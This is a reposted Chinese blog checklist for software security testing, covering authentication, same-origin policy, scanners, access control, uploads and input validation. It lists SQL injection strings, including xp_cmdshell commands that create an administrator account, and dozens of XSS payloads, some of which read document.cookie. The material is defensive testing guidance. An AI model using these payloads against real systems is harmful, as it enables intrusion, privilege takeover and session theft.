---
layout: post
title: "软件安全测试考虑点,测试点以及测试方法整理之一"
date: 2024-12-05 14:18:44 +0800
description: "软件安全性测试主要包括程序、数据库安全性测试。根据系统安全指标不同测试策略也不同。用户身份认证安全的"
keywords: "安全性测试包括哪些"
categories: ['安全性测试']
tags: ['无标签']
artid: "83748489"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=83748489
    alt: "软件安全测试考虑点,测试点以及测试方法整理之一"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=83748489
featuredImagePreview: https://bing.ee123.net/img/rand?artid=83748489
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     软件安全测试考虑点，测试点以及测试方法整理之一
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <p>
     软件安全性测试主要包括程序、数据库安全性测试。根据系统安全指标不同测试策略也不同。
    </p>
    <p>
     用户身份认证安全的测试要考虑问题：
     <br/>
     1.明确区分系统中不同用户权限
     <br/>
     2.系统中会不会出现用户冲突
     <br/>
     3.系统会不会因用户的权限的改变造成混乱
     <br/>
     4.用户登陆密码是否是可见、可复制
     <br/>
     5.系统的密码策略，通常涉及到隐私，钱财或机密性的系统必须设置高可用的密码策略。
     <br/>
     5.是否可以通过绝对途径登陆系统（拷贝用户登陆后的链接直接进入系统）
     <br/>
     6.用户推出系统后是否删除了所有鉴权标记，是否可以使用后退键而不通过输入口令进入系统
    </p>
    <p>
     系统网络安全的测试要考虑问题：
     <br/>
     1.测试采取的防护措施是否正确装配好，有关系统的补丁是否打上
     <br/>
     2.模拟非授权攻击，看防护系统是否坚固
     <br/>
     3.采用成熟的网络漏洞检查工具检查系统相关漏洞（即用最专业的黑客攻击工具攻击试一下，现在最常用的是 NBSI系列和 IPhacker IP ）
     <br/>
     4.采用各种木马检查工具检查系统木马情况
     <br/>
     5.采用各种防外挂工具检查系统各组程序的客外挂漏洞
    </p>
    <p>
     <br/>
     数据库安全考虑问题：
     <br/>
     1.系统数据是否机密（比如对银行系统，这一点就特别重要，一般的网站就没有太高要求）
     <br/>
     2.系统数据的完整性（我刚刚结束的企业实名核查服务系统中就曾存在数据的不完整，对于这个系统的功能实现有了障碍）
     <br/>
     3.系统数据可管理性
     <br/>
     4.系统数据的独立性
     <br/>
     5.系统数据可备份和恢复能力（数据备份是否完整，可否恢复，恢复是否可以完整）
    </p>
    <p>
    </p>
    <p>
     浏览器安全
     <br/>
     同源策略：不同源的“document”或脚本，不能读取或者设置当前的“document”
     <br/>
     同源定义：host（域名，或者IP），port（端口号），protocol（协议）三者一致才属于同源。
     <br/>
     要注意的是，同源策略只是一种策略，而非实现。这个策略被用于一些特定的点来保护web的安全。
     <br/>
     &lt;script&gt;,&lt;img&gt;,&lt;iframe&gt;,&lt;link&gt;等标签都可以跨域加载资源，不受同源策略的限制。
     <br/>
     XMLHttpRequest，DOM，cookie受到同源策略的限制。
     <br/>
     网站可以通过提供crossdomain.xml来允许某些源跨域访问自己的资源。
     <br/>
     google chrome使用了多进程来隔离代码运行的环境，从而起到提高web安全的作用
     <br/>
     Q &amp; A
     <br/>
     Q：cookie为什么需要同源策略？
     <br/>
     A：cookie有同源策略是必须的，这样可以保证A网站的用户（识别）信息不会被B网站获取到
     <br/>
     Q：XMLHttpRequest为什么需要同源策略？
     <br/>
     A：两个例子：
     <br/>
     (1)加入没有同源策略，某个网站的某张页面被你写入了一些js ,这些js有些ajax操作，如果某个用户访问了这张页面，你的js就可以获得用户的某些信息(cookie，本地文件等)然后通过ajax发送回你的服务器。 这就是安全问题，信息泄漏。
     <br/>
     其实这个就是XSS攻击，为了防止XSS攻击后，用ajax请求返回用户敏感信息。但是其实XSS的攻击仅靠XMLHttpRequest的同源策略根本没用，后面的章节会看到。这也许是当时XSS还没那么丰富的时候，还算比较有效的安全策略。
     <br/>
     （2）先假设浏览器没有限制跨域，A站的xhr请求B站的一个url，那么浏览器是要带上谁家的cookie一起请求呢？（每次http请求都要带上该站下的所有cookie）显然是B家的。假设B家的网站当前用户已经登录，那么cookie里自然记录下了sessionId相关的东西以标识当前用户的身份，那么本次xhr请求很easy的通过了身份认证，然后后果就是不堪设想的。
     <br/>
     这个就很正确，如果A可以用xhr跨站访问B，带着B的cookie自然可以通过B网站的验证，从而获取到敏感数据。所以这点是关键。
    </p>
    <p>
     web安全测试方法：
     <br/>
     工具扫描
     <br/>
     目前web安全扫描器针对OSinjection， XSS、SQL injection 、OPEN redirect 、PHP File Include漏洞的检测技术已经比较成熟。
     <br/>
     商业软件web安全扫描器：有IBM Rational Appscan、WebInspect、Acunetix WVS 、burp suite
     <br/>
     免费的扫描器：W3af 、Skipfish 等
     <br/>
     根据业务资金，可以考虑购买商业扫描软件，也可以使用免费的，各有各的好处。
     <br/>
     首页可以对网站进行大规模的扫描操作，工具扫描确认没有漏洞或者漏洞已经修复后，再进行以下手工检测。
    </p>
    <p>
     <br/>
     手工检测
     <br/>
     对于CSRF、越权访问、文件上传、修改密码 等漏洞，难以实现自动化检测的效果，这是因为这些漏洞涉及系统逻辑或业务逻辑，有时候还需要人机交互参与页面流程，
     <br/>
     因此 这类漏洞的检测更多的需要依靠手动测试完成。
    </p>
    <p>
     手工检测网站URL、后台登陆是否具有
    </p>
    <p>
     SQL注入
    </p>
    <p>
     Admin--
     <br/>
     ‘or --
     <br/>
     ‘ and ( ) exec insert * % chr mid
     <br/>
     and 1=1 ; And 1=1 ; aNd 1=1 ; char(97)char(110)char(100) char(49)char(61)char(49) ; %20AND%201=2
     <br/>
     ‘and 1=1 ; ‘And 1=1 ; ‘aNd 1=1 ;
     <br/>
     and 1=2 ; ‘and 1=2
     <br/>
     and 2=2
     <br/>
     and user&gt;0
     <br/>
     and (select count(*) from sysobjects)&gt;0
     <br/>
     and (select count(*) from msysobjects)&gt;0
     <br/>
     and (Select Count(*) from Admin)&gt;=0
     <br/>
     and (select top 1 len(username) from Admin)&gt;0(username 已知字段)
     <br/>
     ;exec master..xp_cmdshell “net user name password /add”—
     <br/>
     ;exec master..xp_cmdshell “net localgroup name administrators /add”—
     <br/>
     and 0&lt;&gt;(select count(*) from admin)
    </p>
    <p>
    </p>
    <p>
     XSS：
    </p>
    <p>
     对于get请求的URL一般漏洞扫描软件都可扫描到是否存在XSS漏洞。（但是软件没有完美的，也有误报，或者有遗漏的情况）
     <br/>
     对于POST的请求的（例如留言板，评论，等等），就是要在输入框输入的情况，则要进行以下测试
     <br/>
     ★~!@#$%^&amp;*()_+&lt;&gt;,./?;'"[]{}\-
     <br/>
     ★%3Cinput /%3E
     <br/>
     ★%3Cscript%3Ealert('XSS')%3C/script%3E
     <br/>
     ★&lt;input type="text"/&gt;
     <br/>
     ★&lt;input/&gt;
     <br/>
     ★&lt;input/
     <br/>
     ★&lt;script&gt;alert('xss')&lt;/script&gt;
     <br/>
     ★&lt;script&gt;alert('xss');&lt;/script&gt;
     <br/>
     ★&lt;/script&gt;&lt;script&gt;alert(‘xss’)&lt;/script&gt;
     <br/>
     ★javascript:alert(/xss/)
     <br/>
     ★javascript:alert(/xss/)
     <br/>
     ★&lt;img src="#" οnerrοr=alert(/xss/)&gt;
     <br/>
     ★&lt;img src="#" style="Xss:expression(alert(/xss/));"&gt;
     <br/>
     ★&lt;img src="#"/**/οnerrοr=alert(/xss/) width=100&gt;
     <br/>
     ★=’&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
     <br/>
     ★1.jpg" οnmοuseοver="alert('xss')
     <br/>
     ★"&gt;&lt;/a&gt;&lt;script&gt;alert(‘xss’);&lt;/script&gt;
     <br/>
     ★http://xxx';alert('xss');var/ a='a
     <br/>
     ★’”&gt;xss&amp;&lt;
     <br/>
     ★"οnmοuseοver=alert('hello');"
     <br/>
     ★&amp;{alert('hello');}
     <br/>
     ★&gt;"'&gt;&lt;script&gt;alert(‘XSS')&lt;/script&gt;
     <br/>
     ★&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27XSS%27)%22&gt;
     <br/>
     ★&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;
     <br/>
     %26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)&gt;
     <br/>
     ★AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22
     <br/>
     ★%22%2Balert(%27XSS%27)%2B%22
     <br/>
     ★&lt;table background="javascript:alert(([code])"&gt;&lt;/table&gt;
     <br/>
     ★&lt;object type=text/html data="javascript:alert(([code]);"&gt;&lt;/object&gt;
     <br/>
     ★&lt;body οnlοad="javascript:alert(([code])"&gt;&lt;/body&gt;
     <br/>
     ★a?&lt;script&gt;alert(’Vulnerable’)&lt;/script&gt;
     <br/>
     ★&lt;!--'"&gt;&amp;:
     <br/>
     var from = ‘$!rundata.Parameters.getString(’from’)';
     <br/>
     var from = ”;hackerFunction(document.cookie);”;
    </p>
    <p>
    </p>
    <p>
     上面这些同样适用于GET请求
     <br/>
     经过以上测试，如果发现输入框代码溢出，则说明可能存在XSS漏洞，说明要进行过滤.
    </p>
    <p>
     <br/>
     关于越权操作的问题
     <br/>
     例如A用户的个人资料ID为1 B用户个人资料ID为2，我通过登陆B用户，把ID修改为1 就可以查看到用户A的个人资料，这就是越权。
     <br/>
     测试方法：通过查看URL的get参数对那些类似明显的顺序数字 进行修改，看是否能越权访问。
    </p>
    <p>
     <br/>
     关于登陆安全的问题
     <br/>
     除了SQL注入，还有找回密码功能会出现安全问题
     <br/>
     邮箱找回密码测试方法：
     <br/>
     先从邮箱参数修改开始，看填入用户名和自己修改的邮箱账号，看是否能收到邮箱，收到后是否能修改。
     <br/>
     如果不能修改邮箱参数那么，我们就让它邮箱找回，接着点击邮箱内修改密码的链接，看链接的邮箱参数是否可以修改，用户名是否可以修改，加密的urlcode 是否可以逆向解密。
     <br/>
     如果是手机找回密码功能：则测试手机收到的验证码是否是纯数字、纯字母的，如果是请修改为字母与数字的组合。
    </p>
    <p>
     关于用开源程序的问题
     <br/>
     关注网上你所用的开源程序的官网更新情况和安全事件。
    </p>
    <p>
     <br/>
     关于上传：
     <br/>
     1.上传文件是否有格式限制,是否可以上传exe文件；
     <br/>
     2.上传文件是否有大小限制,上传太大的文件是否导致异常错误,上传0K的文件是否会导致异常错误,上传并不存在的文件是否会导致异常错误；
     <br/>
     3.通过修改扩展名的方式是否可以绕过格式限制，是否可以通过压包方式绕过格式限制；
     <br/>
     4.是否有上传空间的限制,是否可以超过空间所限制的大小,如将超过空间的大文件拆分上传是否会出现异常错误。
     <br/>
     5.上传文件大小大于本地剩余空间大小，是否会出现异常错误。
     <br/>
     6.关于上传是否成功的判断。上传过程中，中断。程序是否判断上传是否成功。
     <br/>
     7.对于文件名中带有中文字符，特殊字符等的文件上传。
    </p>
    <p>
     下载：
     <br/>
     避免输入：\..\web.
     <br/>
     修改命名后缀。
     <br/>
     输入验证
     <br/>
     客户端验证 服务器端验证(禁用脚本调试，禁用Cookies)
     <br/>
     1.输入很大的数（如4,294,967,269），输入很小的数(负数)
     <br/>
     2.输入超长字符,如对输入文字长度有限制,则尝试超过限制,刚好到达限制字数时有何反应
     <br/>
     3.输入特殊字符,如:~!@#$%^&amp;*()_+&lt;&gt;:”{}|
     <br/>
     4.输入中英文空格，输入字符串中间含空格，输入首尾空格
     <br/>
     5.输入特殊字符串NULL,null，0x0d 0x0a
     <br/>
     6.输入正常字符串
     <br/>
     7.输入与要求不同类型的字符，如: 要求输入数字则检查正值,负值,零值（正零，负零）,小数,字母,空值; 要求输入字母则检查输入数字
     <br/>
     8.输入html和JavaScript代码
     <br/>
     9.对于像回答数这样需检验数字正确性的测试点，不仅对比其与问题最终页的回答数，还要对回答进行添加删除等操作后查看变化
     <br/>
     例如：
     <br/>
     1.输入&lt;html”&gt;”gfhd&lt;/html&gt;
    </p>
    <p>
     转载：
     <a href="https://blog.csdn.net/bo_mask/article/details/76101689">
      https://blog.csdn.net/bo_mask/article/details/76101689
     </a>
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f:626c6f672e6373646e2e6e65742f6d305f3337323638383431:2f61727469636c652f64657461696c732f3833373438343839" class_="artid" style="display:none">
 </p>
</div>


